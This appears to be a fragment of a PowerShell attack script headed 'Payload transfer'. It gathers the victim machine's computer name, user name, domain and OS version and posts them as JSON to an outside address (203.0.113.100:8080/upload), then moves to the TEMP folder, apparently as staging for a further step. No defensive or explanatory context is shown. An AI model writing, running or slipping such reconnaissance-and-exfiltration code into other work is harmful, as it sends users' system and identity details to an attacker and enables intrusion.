
# Payload transfer
$ProfileData = [ordered]@{ ComputerName = $env:COMPUTERNAME; UserName = $env:USERNAME; Domain = $env:USERDOMAIN; OSVersion = [Environment]::OSVersion.VersionString }
Invoke-RestMethod -Uri "http://203.0.113.100:8080/upload" -Method Post -Body ($ProfileData | ConvertTo-Json) -ContentType "application/json"
Set-Location -Path $env:TEMP
